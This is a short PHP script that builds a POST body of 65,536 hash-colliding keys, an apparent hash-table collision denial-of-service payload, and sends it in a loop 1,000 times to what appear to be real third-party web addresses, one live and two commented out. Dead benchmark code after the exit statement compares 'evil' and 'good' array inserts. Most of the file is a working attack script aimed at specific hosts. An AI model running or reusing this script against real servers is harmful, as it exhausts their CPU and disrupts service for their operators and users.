<?php echo '<pre>';

$size = pow(2, 16); // 16 is just an example, could also be 15 or 17

$startTime = microtime(true);

$array = array();
for ($key = 0, $maxKey = ($size - 1) * $size; $key <= $maxKey; $key += $size) {
//    $array[$key] = 0;
$data .= $key.'=&';
}
#$url = 'http://monitor.yoka.com:81/pub/jimmy.php';
#$url = 'http://59.151.9.117/jimmy.php';
$url = 'http://v.yoka.com/jimmy.php';
$rs = array();
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER,0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
for($i=0;$i<1000;$i++){
curl_exec($ch);
$info = curl_getinfo($ch);
echo " -----------------------------------------------------------------------------\n\n";var_dump($info);
}
curl_close($ch);

exit;

///////////////////////////////////////////////////////////////////////////////////////////////////////////
//
//
$endTime = microtime(true);

echo 'Inserting ', $size, ' evil elements took ', $endTime - $startTime, ' seconds', "\n";

$startTime = microtime(true);

$array = array();
for ($key = 0, $maxKey = $size - 1; $key <= $maxKey; ++$key) {
    $array[$key] = 0;
}

$endTime = microtime(true);

echo 'Inserting ', $size, ' good elements took ', $endTime - $startTime, ' seconds', "\n";
?>
